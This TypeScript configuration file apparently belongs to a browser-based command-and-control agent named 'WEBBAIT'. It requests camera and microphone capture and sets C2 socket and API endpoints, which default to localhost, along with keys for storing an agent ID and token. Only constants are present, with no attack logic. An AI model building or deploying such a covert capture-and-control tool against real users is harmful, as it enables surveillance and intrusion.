export const MEDIA_CONSTRAINTS: MediaStreamConstraints = {
	audio: true,
	video: { width: 640, height: 360, frameRate: 24 },
};

export const C2_SOCKET_ENDPOINT =
	import.meta.env.C2_SOCKET_ENDPOINT || "wss://localhost:4000/agents/socket";

export const C2_API_ENDPOINT =
	import.meta.env.C2_API_ENDPOINT || "https://localhost:4000/api/agents";

export const AGENT_ID_KEY = "WEBBAIT_AGENT_ID";

export const TOKEN_KEY = "WEBBAIT_TOKEN";
